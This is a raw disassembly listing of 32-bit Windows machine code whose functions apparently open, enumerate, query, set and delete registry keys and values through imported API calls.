  405f8a:	90                   	nop
  405f8b:	90                   	nop
  405f8c:	90                   	nop
  405f8d:	90                   	nop
  405f8e:	90                   	nop
  405f8f:	90                   	nop
  405f90:	c2 08 00             	ret    $0x8
  405f93:	90                   	nop
  405f94:	90                   	nop
  405f95:	90                   	nop
  405f96:	90                   	nop
  405f97:	90                   	nop
  405f98:	90                   	nop
  405f99:	90                   	nop
  405f9a:	90                   	nop
  405f9b:	90                   	nop
  405f9c:	90                   	nop
  405f9d:	90                   	nop
  405f9e:	90                   	nop
  405f9f:	90                   	nop
  405fa0:	55                   	push   %ebp
  405fa1:	8b ec                	mov    %esp,%ebp
  405fa3:	6a ff                	push   $0xffffffff
  405fa5:	68 30 ac 40 00       	push   $0x40ac30
  405faa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405fb0:	50                   	push   %eax
  405fb1:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405fb8:	83 ec 08             	sub    $0x8,%esp
  405fbb:	8b 55 08             	mov    0x8(%ebp),%edx
  405fbe:	8b 49 04             	mov    0x4(%ecx),%ecx
  405fc1:	53                   	push   %ebx
  405fc2:	33 c0                	xor    %eax,%eax
  405fc4:	56                   	push   %esi
  405fc5:	57                   	push   %edi
  405fc6:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405fc9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405fcc:	8b 45 0c             	mov    0xc(%ebp),%eax
  405fcf:	89 65 f0             	mov    %esp,-0x10(%ebp)
  405fd2:	50                   	push   %eax
  405fd3:	52                   	push   %edx
  405fd4:	e8 17 c2 ff ff       	call   0x4021f0
  405fd9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405fdc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405fe3:	5f                   	pop    %edi
  405fe4:	5e                   	pop    %esi
  405fe5:	5b                   	pop    %ebx
  405fe6:	8b e5                	mov    %ebp,%esp
  405fe8:	5d                   	pop    %ebp
  405fe9:	c2 08 00             	ret    $0x8
  405fec:	b8 f2 5f 40 00       	mov    $0x405ff2,%eax
  405ff1:	c3                   	ret
  405ff2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405ff5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405ff8:	5f                   	pop    %edi
  405ff9:	5e                   	pop    %esi
  405ffa:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406001:	5b                   	pop    %ebx
  406002:	8b e5                	mov    %ebp,%esp
  406004:	5d                   	pop    %ebp
  406005:	c2 08 00             	ret    $0x8
  406008:	90                   	nop
  406009:	90                   	nop
  40600a:	90                   	nop
  40600b:	90                   	nop
  40600c:	90                   	nop
  40600d:	90                   	nop
  40600e:	90                   	nop
  40600f:	90                   	nop
  406010:	8b 41 08             	mov    0x8(%ecx),%eax
  406013:	6a ff                	push   $0xffffffff
  406015:	50                   	push   %eax
  406016:	ff 15 dc b1 40 00    	call   *0x40b1dc
  40601c:	68 96 00 00 00       	push   $0x96
  406021:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  406027:	c3                   	ret
  406028:	90                   	nop
  406029:	90                   	nop
  40602a:	90                   	nop
  40602b:	90                   	nop
  40602c:	90                   	nop
  40602d:	90                   	nop
  40602e:	90                   	nop
  40602f:	90                   	nop
  406030:	8b 41 08             	mov    0x8(%ecx),%eax
  406033:	50                   	push   %eax
  406034:	ff 15 d8 b1 40 00    	call   *0x40b1d8
  40603a:	c3                   	ret
  40603b:	90                   	nop
  40603c:	90                   	nop
  40603d:	90                   	nop
  40603e:	90                   	nop
  40603f:	90                   	nop
  406040:	53                   	push   %ebx
  406041:	55                   	push   %ebp
  406042:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  406046:	56                   	push   %esi
  406047:	57                   	push   %edi
  406048:	8b 3d 34 b2 40 00    	mov    0x40b234,%edi
  40604e:	33 db                	xor    %ebx,%ebx
  406050:	8b f5                	mov    %ebp,%esi
  406052:	6a 01                	push   $0x1
  406054:	68 7c e1 40 00       	push   $0x40e17c
  406059:	56                   	push   %esi
  40605a:	ff d7                	call   *%edi
  40605c:	83 c4 0c             	add    $0xc,%esp
  40605f:	85 c0                	test   %eax,%eax
  406061:	75 04                	jne    0x406067
  406063:	43                   	inc    %ebx
  406064:	46                   	inc    %esi
  406065:	eb eb                	jmp    0x406052
  406067:	5f                   	pop    %edi
  406068:	8d 04 2b             	lea    (%ebx,%ebp,1),%eax
  40606b:	5e                   	pop    %esi
  40606c:	5d                   	pop    %ebp
  40606d:	5b                   	pop    %ebx
  40606e:	c3                   	ret
  40606f:	90                   	nop
  406070:	55                   	push   %ebp
  406071:	8b ec                	mov    %esp,%ebp
  406073:	6a ff                	push   $0xffffffff
  406075:	68 b0 b4 40 00       	push   $0x40b4b0
  40607a:	68 62 a7 40 00       	push   $0x40a762
  40607f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406085:	50                   	push   %eax
  406086:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40608d:	81 ec 4c 02 00 00    	sub    $0x24c,%esp
  406093:	53                   	push   %ebx
  406094:	56                   	push   %esi
  406095:	57                   	push   %edi
  406096:	33 db                	xor    %ebx,%ebx
  406098:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40609b:	b9 08 00 00 00       	mov    $0x8,%ecx
  4060a0:	33 c0                	xor    %eax,%eax
  4060a2:	8d bd b4 fe ff ff    	lea    -0x14c(%ebp),%edi
  4060a8:	f3 ab                	rep stos %eax,%es:(%edi)
  4060aa:	b9 41 00 00 00       	mov    $0x41,%ecx
  4060af:	8d bd d4 fe ff ff    	lea    -0x12c(%ebp),%edi
  4060b5:	f3 ab                	rep stos %eax,%es:(%edi)
  4060b7:	b9 41 00 00 00       	mov    $0x41,%ecx
  4060bc:	8d bd a8 fd ff ff    	lea    -0x258(%ebp),%edi
  4060c2:	f3 ab                	rep stos %eax,%es:(%edi)
  4060c4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4060c7:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  4060cd:	50                   	push   %eax
  4060ce:	68 19 00 02 00       	push   $0x20019
  4060d3:	53                   	push   %ebx
  4060d4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4060d7:	51                   	push   %ecx
  4060d8:	8b 55 08             	mov    0x8(%ebp),%edx
  4060db:	52                   	push   %edx
  4060dc:	ff 15 14 b0 40 00    	call   *0x40b014
  4060e2:	85 c0                	test   %eax,%eax
  4060e4:	74 27                	je     0x40610d
  4060e6:	c7 45 dc ff ff ff ff 	movl   $0xffffffff,-0x24(%ebp)
  4060ed:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4060f4:	e8 96 03 00 00       	call   0x40648f
  4060f9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4060fc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4060ff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406106:	5f                   	pop    %edi
  406107:	5e                   	pop    %esi
  406108:	5b                   	pop    %ebx
  406109:	8b e5                	mov    %ebp,%esp
  40610b:	5d                   	pop    %ebp
  40610c:	c3                   	ret
  40610d:	8b 45 24             	mov    0x24(%ebp),%eax
  406110:	83 f8 03             	cmp    $0x3,%eax
  406113:	0f 87 01 01 00 00    	ja     0x40621a
  406119:	ff 24 85 bc 64 40 00 	jmp    *0x4064bc(,%eax,4)
  406120:	8b 45 14             	mov    0x14(%ebp),%eax
  406123:	48                   	dec    %eax
  406124:	83 f8 06             	cmp    $0x6,%eax
  406127:	0f 87 ed 00 00 00    	ja     0x40621a
  40612d:	ff 24 85 cc 64 40 00 	jmp    *0x4064cc(,%eax,4)
  406134:	c7 45 e4 04 01 00 00 	movl   $0x104,-0x1c(%ebp)
  40613b:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40613e:	51                   	push   %ecx
  40613f:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  406145:	52                   	push   %edx
  406146:	8d 45 14             	lea    0x14(%ebp),%eax
  406149:	50                   	push   %eax
  40614a:	53                   	push   %ebx
  40614b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40614e:	51                   	push   %ecx
  40614f:	8b 95 a4 fd ff ff    	mov    -0x25c(%ebp),%edx
  406155:	52                   	push   %edx
  406156:	ff 15 74 b0 40 00    	call   *0x40b074
  40615c:	85 c0                	test   %eax,%eax
  40615e:	0f 85 b6 00 00 00    	jne    0x40621a
  406164:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  40616a:	50                   	push   %eax
  40616b:	e8 d0 fe ff ff       	call   0x406040
  406170:	83 c4 04             	add    $0x4,%esp
  406173:	8b f8                	mov    %eax,%edi
  406175:	eb 7e                	jmp    0x4061f5
  406177:	c7 45 e4 04 01 00 00 	movl   $0x104,-0x1c(%ebp)
  40617e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406181:	50                   	push   %eax
  406182:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  406188:	51                   	push   %ecx
  406189:	8d 55 14             	lea    0x14(%ebp),%edx
  40618c:	52                   	push   %edx
  40618d:	53                   	push   %ebx
  40618e:	8b 45 10             	mov    0x10(%ebp),%eax
  406191:	50                   	push   %eax
  406192:	8b 8d a4 fd ff ff    	mov    -0x25c(%ebp),%ecx
  406198:	51                   	push   %ecx
  406199:	ff 15 74 b0 40 00    	call   *0x40b074
  40619f:	85 c0                	test   %eax,%eax
  4061a1:	75 77                	jne    0x40621a
  4061a3:	8d b5 d4 fe ff ff    	lea    -0x12c(%ebp),%esi
  4061a9:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4061ac:	8b 1d 58 b2 40 00    	mov    0x40b258,%ebx
  4061b2:	8b 3d 6c b2 40 00    	mov    0x40b26c,%edi
  4061b8:	80 3e 00             	cmpb   $0x0,(%esi)
  4061bb:	74 32                	je     0x4061ef
  4061bd:	68 04 01 00 00       	push   $0x104
  4061c2:	56                   	push   %esi
  4061c3:	8d 95 a8 fd ff ff    	lea    -0x258(%ebp),%edx
  4061c9:	52                   	push   %edx
  4061ca:	ff d7                	call   *%edi
  4061cc:	68 04 01 00 00       	push   $0x104
  4061d1:	68 7c e1 40 00       	push   $0x40e17c
  4061d6:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  4061dc:	50                   	push   %eax
  4061dd:	ff d7                	call   *%edi
  4061df:	6a 00                	push   $0x0
  4061e1:	56                   	push   %esi
  4061e2:	ff d3                	call   *%ebx
  4061e4:	83 c4 20             	add    $0x20,%esp
  4061e7:	40                   	inc    %eax
  4061e8:	8b f0                	mov    %eax,%esi
  4061ea:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4061ed:	eb c9                	jmp    0x4061b8
  4061ef:	8d bd a8 fd ff ff    	lea    -0x258(%ebp),%edi
  4061f5:	83 c9 ff             	or     $0xffffffff,%ecx
  4061f8:	33 c0                	xor    %eax,%eax
  4061fa:	f2 ae                	repnz scas %es:(%edi),%al
  4061fc:	f7 d1                	not    %ecx
  4061fe:	2b f9                	sub    %ecx,%edi
  406200:	8b d1                	mov    %ecx,%edx
  406202:	8b f7                	mov    %edi,%esi
  406204:	8b 7d 18             	mov    0x18(%ebp),%edi
  406207:	c1 e9 02             	shr    $0x2,%ecx
  40620a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40620c:	8b ca                	mov    %edx,%ecx
  40620e:	83 e1 03             	and    $0x3,%ecx
  406211:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406213:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  40621a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406221:	e8 69 02 00 00       	call   0x40648f
  406226:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406229:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40622c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406233:	5f                   	pop    %edi
  406234:	5e                   	pop    %esi
  406235:	5b                   	pop    %ebx
  406236:	8b e5                	mov    %ebp,%esp
  406238:	5d                   	pop    %ebp
  406239:	c3                   	ret
  40623a:	c7 45 e4 04 00 00 00 	movl   $0x4,-0x1c(%ebp)
  406241:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406244:	50                   	push   %eax
  406245:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  40624b:	51                   	push   %ecx
  40624c:	8d 55 14             	lea    0x14(%ebp),%edx
  40624f:	52                   	push   %edx
  406250:	53                   	push   %ebx
  406251:	8b 45 10             	mov    0x10(%ebp),%eax
  406254:	50                   	push   %eax
  406255:	8b 8d a4 fd ff ff    	mov    -0x25c(%ebp),%ecx
  40625b:	51                   	push   %ecx
  40625c:	ff 15 74 b0 40 00    	call   *0x40b074
  406262:	85 c0                	test   %eax,%eax
  406264:	75 b4                	jne    0x40621a
  406266:	8b 95 b0 fe ff ff    	mov    -0x150(%ebp),%edx
  40626c:	52                   	push   %edx
  40626d:	68 00 e4 40 00       	push   $0x40e400
  406272:	8b 45 18             	mov    0x18(%ebp),%eax
  406275:	50                   	push   %eax
  406276:	ff 15 78 b3 40 00    	call   *0x40b378
  40627c:	83 c4 0c             	add    $0xc,%esp
  40627f:	eb 92                	jmp    0x406213
  406281:	8b 4d 20             	mov    0x20(%ebp),%ecx
  406284:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  406287:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40628a:	52                   	push   %edx
  40628b:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40628e:	50                   	push   %eax
  40628f:	8d 4d 14             	lea    0x14(%ebp),%ecx
  406292:	51                   	push   %ecx
  406293:	53                   	push   %ebx
  406294:	8b 55 10             	mov    0x10(%ebp),%edx
  406297:	52                   	push   %edx
  406298:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  40629e:	50                   	push   %eax
  40629f:	ff 15 74 b0 40 00    	call   *0x40b074
  4062a5:	85 c0                	test   %eax,%eax
  4062a7:	0f 85 6d ff ff ff    	jne    0x40621a
  4062ad:	e9 61 ff ff ff       	jmp    0x406213
  4062b2:	b9 41 00 00 00       	mov    $0x41,%ecx
  4062b7:	33 c0                	xor    %eax,%eax
  4062b9:	8d bd d4 fe ff ff    	lea    -0x12c(%ebp),%edi
  4062bf:	f3 ab                	rep stos %eax,%es:(%edi)
  4062c1:	c7 45 e4 04 01 00 00 	movl   $0x104,-0x1c(%ebp)
  4062c8:	8b c3                	mov    %ebx,%eax
  4062ca:	43                   	inc    %ebx
  4062cb:	89 9d ac fe ff ff    	mov    %ebx,-0x154(%ebp)
  4062d1:	6a 00                	push   $0x0
  4062d3:	6a 00                	push   $0x0
  4062d5:	6a 00                	push   $0x0
  4062d7:	6a 00                	push   $0x0
  4062d9:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4062dc:	51                   	push   %ecx
  4062dd:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  4062e3:	52                   	push   %edx
  4062e4:	50                   	push   %eax
  4062e5:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  4062eb:	50                   	push   %eax
  4062ec:	ff 15 50 b0 40 00    	call   *0x40b050
  4062f2:	85 c0                	test   %eax,%eax
  4062f4:	0f 85 20 ff ff ff    	jne    0x40621a
  4062fa:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  406300:	51                   	push   %ecx
  406301:	68 f8 e3 40 00       	push   $0x40e3f8
  406306:	8d 95 a8 fd ff ff    	lea    -0x258(%ebp),%edx
  40630c:	52                   	push   %edx
  40630d:	ff 15 78 b3 40 00    	call   *0x40b378
  406313:	83 c4 0c             	add    $0xc,%esp
  406316:	8d bd a8 fd ff ff    	lea    -0x258(%ebp),%edi
  40631c:	83 c9 ff             	or     $0xffffffff,%ecx
  40631f:	33 c0                	xor    %eax,%eax
  406321:	f2 ae                	repnz scas %es:(%edi),%al
  406323:	f7 d1                	not    %ecx
  406325:	2b f9                	sub    %ecx,%edi
  406327:	8b f7                	mov    %edi,%esi
  406329:	8b d1                	mov    %ecx,%edx
  40632b:	8b 7d 18             	mov    0x18(%ebp),%edi
  40632e:	83 c9 ff             	or     $0xffffffff,%ecx
  406331:	f2 ae                	repnz scas %es:(%edi),%al
  406333:	4f                   	dec    %edi
  406334:	8b ca                	mov    %edx,%ecx
  406336:	c1 e9 02             	shr    $0x2,%ecx
  406339:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40633b:	8b ca                	mov    %edx,%ecx
  40633d:	83 e1 03             	and    $0x3,%ecx
  406340:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406342:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  406349:	e9 64 ff ff ff       	jmp    0x4062b2
  40634e:	8b 35 78 b3 40 00    	mov    0x40b378,%esi
  406354:	b9 08 00 00 00       	mov    $0x8,%ecx
  406359:	33 c0                	xor    %eax,%eax
  40635b:	8d bd b4 fe ff ff    	lea    -0x14c(%ebp),%edi
  406361:	f3 ab                	rep stos %eax,%es:(%edi)
  406363:	b9 41 00 00 00       	mov    $0x41,%ecx
  406368:	8d bd d4 fe ff ff    	lea    -0x12c(%ebp),%edi
  40636e:	f3 ab                	rep stos %eax,%es:(%edi)
  406370:	b9 41 00 00 00       	mov    $0x41,%ecx
  406375:	8d bd a8 fd ff ff    	lea    -0x258(%ebp),%edi
  40637b:	f3 ab                	rep stos %eax,%es:(%edi)
  40637d:	c7 45 e0 20 00 00 00 	movl   $0x20,-0x20(%ebp)
  406384:	c7 45 e4 04 01 00 00 	movl   $0x104,-0x1c(%ebp)
  40638b:	8b c3                	mov    %ebx,%eax
  40638d:	43                   	inc    %ebx
  40638e:	89 9d ac fe ff ff    	mov    %ebx,-0x154(%ebp)
  406394:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  406397:	51                   	push   %ecx
  406398:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  40639e:	52                   	push   %edx
  40639f:	8d 4d 14             	lea    0x14(%ebp),%ecx
  4063a2:	51                   	push   %ecx
  4063a3:	6a 00                	push   $0x0
  4063a5:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4063a8:	52                   	push   %edx
  4063a9:	8d 8d b4 fe ff ff    	lea    -0x14c(%ebp),%ecx
  4063af:	51                   	push   %ecx
  4063b0:	50                   	push   %eax
  4063b1:	8b 95 a4 fd ff ff    	mov    -0x25c(%ebp),%edx
  4063b7:	52                   	push   %edx
  4063b8:	ff 15 54 b0 40 00    	call   *0x40b054
  4063be:	85 c0                	test   %eax,%eax
  4063c0:	0f 85 54 fe ff ff    	jne    0x40621a
  4063c6:	8b 45 14             	mov    0x14(%ebp),%eax
  4063c9:	48                   	dec    %eax
  4063ca:	83 f8 06             	cmp    $0x6,%eax
  4063cd:	0f 87 9f 00 00 00    	ja     0x406472
  4063d3:	ff 24 85 e8 64 40 00 	jmp    *0x4064e8(,%eax,4)
  4063da:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  4063e0:	51                   	push   %ecx
  4063e1:	68 f0 e3 40 00       	push   $0x40e3f0
  4063e6:	eb 0c                	jmp    0x4063f4
  4063e8:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  4063ee:	51                   	push   %ecx
  4063ef:	68 e0 e3 40 00       	push   $0x40e3e0
  4063f4:	8d 95 b4 fe ff ff    	lea    -0x14c(%ebp),%edx
  4063fa:	52                   	push   %edx
  4063fb:	68 cc e3 40 00       	push   $0x40e3cc
  406400:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  406406:	50                   	push   %eax
  406407:	ff d6                	call   *%esi
  406409:	83 c4 14             	add    $0x14,%esp
  40640c:	eb 64                	jmp    0x406472
  40640e:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  406414:	51                   	push   %ecx
  406415:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  40641b:	52                   	push   %edx
  40641c:	68 c0 e3 40 00       	push   $0x40e3c0
  406421:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  406427:	50                   	push   %eax
  406428:	68 a8 e3 40 00       	push   $0x40e3a8
  40642d:	8d 8d a8 fd ff ff    	lea    -0x258(%ebp),%ecx
  406433:	51                   	push   %ecx
  406434:	ff d6                	call   *%esi
  406436:	83 c4 18             	add    $0x18,%esp
  406439:	eb 37                	jmp    0x406472
  40643b:	68 98 e3 40 00       	push   $0x40e398
  406440:	8d 95 b4 fe ff ff    	lea    -0x14c(%ebp),%edx
  406446:	52                   	push   %edx
  406447:	68 88 e3 40 00       	push   $0x40e388
  40644c:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  406452:	50                   	push   %eax
  406453:	eb 18                	jmp    0x40646d
  406455:	68 7c e3 40 00       	push   $0x40e37c
  40645a:	8d 8d b4 fe ff ff    	lea    -0x14c(%ebp),%ecx
  406460:	51                   	push   %ecx
  406461:	68 88 e3 40 00       	push   $0x40e388
  406466:	8d 95 a8 fd ff ff    	lea    -0x258(%ebp),%edx
  40646c:	52                   	push   %edx
  40646d:	ff d6                	call   *%esi
  40646f:	83 c4 10             	add    $0x10,%esp
  406472:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  406478:	50                   	push   %eax
  406479:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40647c:	51                   	push   %ecx
  40647d:	ff 15 d0 b0 40 00    	call   *0x40b0d0
  406483:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  40648a:	e9 c5 fe ff ff       	jmp    0x406354
  40648f:	8b 55 08             	mov    0x8(%ebp),%edx
  406492:	52                   	push   %edx
  406493:	8b 35 34 b0 40 00    	mov    0x40b034,%esi
  406499:	ff d6                	call   *%esi
  40649b:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  4064a1:	50                   	push   %eax
  4064a2:	ff d6                	call   *%esi
  4064a4:	c3                   	ret
  4064a5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4064a8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4064ab:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4064b2:	5f                   	pop    %edi
  4064b3:	5e                   	pop    %esi
  4064b4:	5b                   	pop    %ebx
  4064b5:	8b e5                	mov    %ebp,%esp
  4064b7:	5d                   	pop    %ebp
  4064b8:	c3                   	ret
  4064b9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4064bc:	20 61 40             	and    %ah,0x40(%ecx)
  4064bf:	00 b2 62 40 00 4e    	add    %dh,0x4e004062(%edx)
  4064c5:	63 40 00             	arpl   %eax,0x0(%eax)
  4064c8:	13 62 40             	adc    0x40(%edx),%esp
  4064cb:	00 34 61             	add    %dh,(%ecx,%eiz,2)
  4064ce:	40                   	inc    %eax
  4064cf:	00 34 61             	add    %dh,(%ecx,%eiz,2)
  4064d2:	40                   	inc    %eax
  4064d3:	00 81 62 40 00 3a    	add    %al,0x3a004062(%ecx)
  4064d9:	62 40 00             	bound  %eax,0x0(%eax)
  4064dc:	1a 62 40             	sbb    0x40(%edx),%ah
  4064df:	00 1a                	add    %bl,(%edx)
  4064e1:	62 40 00             	bound  %eax,0x0(%eax)
  4064e4:	77 61                	ja     0x406547
  4064e6:	40                   	inc    %eax
  4064e7:	00 da                	add    %bl,%dl
  4064e9:	63 40 00             	arpl   %eax,0x0(%eax)
  4064ec:	e8 63 40 00 55       	call   0x5540a554
  4064f1:	64 40                	fs inc %eax
  4064f3:	00 0e                	add    %cl,(%esi)
  4064f5:	64 40                	fs inc %eax
  4064f7:	00 72 64             	add    %dh,0x64(%edx)
  4064fa:	40                   	inc    %eax
  4064fb:	00 72 64             	add    %dh,0x64(%edx)
  4064fe:	40                   	inc    %eax
  4064ff:	00 3b                	add    %bh,(%ebx)
  406501:	64 40                	fs inc %eax
  406503:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  406509:	90                   	nop
  40650a:	90                   	nop
  40650b:	90                   	nop
  40650c:	90                   	nop
  40650d:	90                   	nop
  40650e:	90                   	nop
  40650f:	90                   	nop
  406510:	55                   	push   %ebp
  406511:	8b ec                	mov    %esp,%ebp
  406513:	6a ff                	push   $0xffffffff
  406515:	68 c0 b4 40 00       	push   $0x40b4c0
  40651a:	68 62 a7 40 00       	push   $0x40a762
  40651f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406525:	50                   	push   %eax
  406526:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40652d:	83 ec 14             	sub    $0x14,%esp
  406530:	53                   	push   %ebx
  406531:	56                   	push   %esi
  406532:	57                   	push   %edi
  406533:	33 db                	xor    %ebx,%ebx
  406535:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  406538:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40653b:	8b 45 20             	mov    0x20(%ebp),%eax
  40653e:	83 f8 03             	cmp    $0x3,%eax
  406541:	0f 87 14 01 00 00    	ja     0x40665b
  406547:	ff 24 85 90 66 40 00 	jmp    *0x406690(,%eax,4)
  40654e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406551:	50                   	push   %eax
  406552:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406555:	51                   	push   %ecx
  406556:	53                   	push   %ebx
  406557:	68 3f 00 0f 00       	push   $0xf003f
  40655c:	53                   	push   %ebx
  40655d:	53                   	push   %ebx
  40655e:	53                   	push   %ebx
  40655f:	8b 55 0c             	mov    0xc(%ebp),%edx
  406562:	52                   	push   %edx
  406563:	8b 45 08             	mov    0x8(%ebp),%eax
  406566:	50                   	push   %eax
  406567:	ff 15 44 b0 40 00    	call   *0x40b044
  40656d:	85 c0                	test   %eax,%eax
  40656f:	0f 85 e6 00 00 00    	jne    0x40665b
  406575:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406578:	51                   	push   %ecx
  406579:	68 1f 00 02 00       	push   $0x2001f
  40657e:	53                   	push   %ebx
  40657f:	8b 55 0c             	mov    0xc(%ebp),%edx
  406582:	52                   	push   %edx
  406583:	8b 45 08             	mov    0x8(%ebp),%eax
  406586:	50                   	push   %eax
  406587:	ff 15 14 b0 40 00    	call   *0x40b014
  40658d:	85 c0                	test   %eax,%eax
  40658f:	0f 85 c6 00 00 00    	jne    0x40665b
  406595:	8b 55 14             	mov    0x14(%ebp),%edx
  406598:	3b d3                	cmp    %ebx,%edx
  40659a:	0f 86 bb 00 00 00    	jbe    0x40665b
  4065a0:	83 fa 02             	cmp    $0x2,%edx
  4065a3:	76 2b                	jbe    0x4065d0
  4065a5:	83 fa 04             	cmp    $0x4,%edx
  4065a8:	0f 85 ad 00 00 00    	jne    0x40665b
  4065ae:	52                   	push   %edx
  4065af:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  4065b2:	51                   	push   %ecx
  4065b3:	52                   	push   %edx
  4065b4:	53                   	push   %ebx
  4065b5:	8b 55 10             	mov    0x10(%ebp),%edx
  4065b8:	52                   	push   %edx
  4065b9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4065bc:	50                   	push   %eax
  4065bd:	ff 15 20 b0 40 00    	call   *0x40b020
  4065c3:	85 c0                	test   %eax,%eax
  4065c5:	0f 85 90 00 00 00    	jne    0x40665b
  4065cb:	e9 84 00 00 00       	jmp    0x406654
  4065d0:	8b 75 18             	mov    0x18(%ebp),%esi
  4065d3:	8b fe                	mov    %esi,%edi
  4065d5:	83 c9 ff             	or     $0xffffffff,%ecx
  4065d8:	33 c0                	xor    %eax,%eax
  4065da:	f2 ae                	repnz scas %es:(%edi),%al
  4065dc:	f7 d1                	not    %ecx
  4065de:	51                   	push   %ecx
  4065df:	56                   	push   %esi
  4065e0:	52                   	push   %edx
  4065e1:	53                   	push   %ebx
  4065e2:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4065e5:	51                   	push   %ecx
  4065e6:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4065e9:	52                   	push   %edx
  4065ea:	ff 15 20 b0 40 00    	call   *0x40b020
  4065f0:	85 c0                	test   %eax,%eax
  4065f2:	75 67                	jne    0x40665b
  4065f4:	eb 5e                	jmp    0x406654
  4065f6:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4065f9:	50                   	push   %eax
  4065fa:	68 1f 00 02 00       	push   $0x2001f
  4065ff:	53                   	push   %ebx
  406600:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406603:	51                   	push   %ecx
  406604:	8b 55 08             	mov    0x8(%ebp),%edx
  406607:	52                   	push   %edx
  406608:	ff 15 14 b0 40 00    	call   *0x40b014
  40660e:	85 c0                	test   %eax,%eax
  406610:	75 49                	jne    0x40665b
  406612:	8b 45 10             	mov    0x10(%ebp),%eax
  406615:	50                   	push   %eax
  406616:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406619:	51                   	push   %ecx
  40661a:	ff 15 48 b0 40 00    	call   *0x40b048
  406620:	85 c0                	test   %eax,%eax
  406622:	75 37                	jne    0x40665b
  406624:	eb 2e                	jmp    0x406654
  406626:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406629:	52                   	push   %edx
  40662a:	68 1f 00 02 00       	push   $0x2001f
  40662f:	53                   	push   %ebx
  406630:	8b 45 0c             	mov    0xc(%ebp),%eax
  406633:	50                   	push   %eax
  406634:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406637:	51                   	push   %ecx
  406638:	ff 15 14 b0 40 00    	call   *0x40b014
